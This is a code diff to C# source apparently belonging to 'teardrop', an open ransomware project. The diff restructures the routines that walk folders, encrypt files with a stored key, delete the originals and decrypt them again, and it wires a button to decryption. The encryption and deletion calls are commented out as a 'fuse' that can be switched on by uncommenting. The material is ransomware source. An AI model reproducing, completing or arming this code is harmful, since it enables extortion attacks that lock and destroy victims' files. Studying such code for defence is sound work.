@@ -53,7 +53,7 @@ namespace teardrop
         {
             try
             {
-                if (File.Exists(Application.StartupPath + "\\log.txt"));
+                if (File.Exists(Application.StartupPath + "\\log.txt"))
                 {
                     string prefix = "[" + DateTime.Now + "] ";
                     File.AppendAllText(Application.StartupPath + "\\log.txt", prefix + text + Environment.NewLine);
@@ -399,7 +399,16 @@ namespace teardrop
                                 if (validExtensions.Contains(ext.ToLower())) // ToLower() is used because a txt file can have the extension txt, TXT, tXT and it would still work.
                                 {
                                     // This now acts like a fuse so you dont accidentaly encrypt your own hard drive while testing. Uncomment line below to encrypt files
-                                    // Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+                                    //if(mode == "encrypt")
+                                    //{
+                                    //    Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+                                    //    write("Encrypted " + s);
+                                    //}
+                                    //else if(mode == "decrypt")
+                                    //{
+                                    //    Task.Run(() => Crypto.FileDecrypt(s, s.Replace(Properties.Settings.Default.extension, ""), Properties.Settings.Default.key));
+                                    //    write("Decrypted " + s);
+                                    //}
 
                                     try
                                     {
@@ -411,8 +420,6 @@ namespace teardrop
                                         write("Cant delete file " + ex2.Message);
                                         Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
                                     }
-
-                                    write("Encrypted " + s);
                                 }
 
                             }
@@ -440,15 +447,31 @@ namespace teardrop
                     {
                         if (!s.Contains(Properties.Settings.Default.extension) && !s.Contains("Sytem Volume Information") && mode != "decrypt")
                         {
-                            if(mode != "decrypt")
+                            // FUSE
+                            //Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+                            write("Encrypted " + s);
+
+                            try
                             {
                                 // FUSE
-                                //Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
-                                write("Encrypted " + s);
+                                //File.Delete(s);
+                            }
+                            catch (Exception ex2)
+                            {
+                                write("Cant delete file " + ex2.Message);
+                                Log(ex2.Message, "GetFiles > File Delete Error");
+                            }
+                        }
+                        else if(mode == "decrypt")
+                        {
+                            if(s.Contains(Properties.Settings.Default.extension) && !s.Contains("System Volume Information"))
+                            {
+                                Task.Run(() => Crypto.FileDecrypt(s, s.Replace(Properties.Settings.Default.extension, ""), Properties.Settings.Default.key));
+                                write("Decrypted " + s);
 
                                 try
                                 {
-                                    // FUSE
+                                    // Delete original encrypted file?
                                     //File.Delete(s);
                                 }
                                 catch (Exception ex2)
@@ -456,14 +479,6 @@ namespace teardrop
                                     write("Cant delete file " + ex2.Message);
                                     Log(ex2.Message, "GetFiles > File Delete Error");
                                 }
-                            }
-                        }
-                        else if(mode == "decrypt")
-                        {
-                            if(s.Contains(Properties.Settings.Default.extension) && !s.Contains("System Volume Information"))
-                            {
-                                Task.Run(() => Crypto.FileDecrypt(s, s.Replace(Properties.Settings.Default.extension, "") , Properties.Settings.Default.key));
-                                write("Decrypted " + s);
                             }
                         }
                     }
@@ -571,7 +586,7 @@ namespace teardrop
 
         private void button1_Click(object sender, EventArgs e)
         {
-
+            GetFiles("decrypt");
         }
     }
 }
